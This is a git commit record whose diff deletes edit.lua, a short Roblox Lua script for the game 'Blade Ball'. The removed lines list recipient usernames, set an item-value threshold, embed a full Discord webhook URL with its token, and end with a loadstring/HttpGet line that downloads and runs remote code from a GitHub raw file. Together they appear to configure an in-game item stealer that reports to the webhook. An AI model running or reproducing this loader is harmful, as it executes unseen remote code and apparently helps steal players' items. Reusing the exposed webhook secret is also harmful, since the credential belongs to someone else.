e936f00be57232f1c91a63e0440be6f1bfe6a8bd
Scriptsnet <maramarajadematthew@gmail.com>
2026-01-22 21:41:45 +0800

    Delete edit.lua

--- edit.lua
+++
@@ -1,6 +0,0 @@
-_G.Usernames = {"ymtthw1", "benok_karl", "tresbigT"} -- you can add as many as you'd like
-_G.min_rap = 0
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1462380513061769318/ZXgIgeG6PQmEGi1DzU7MC-yZAXegtbbAAw59J5HBCUXfB_0B9m3gI0CX4jHypVuL0NDW" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Scriptsnets/BladeBall/refs/heads/main/source.lua"))()
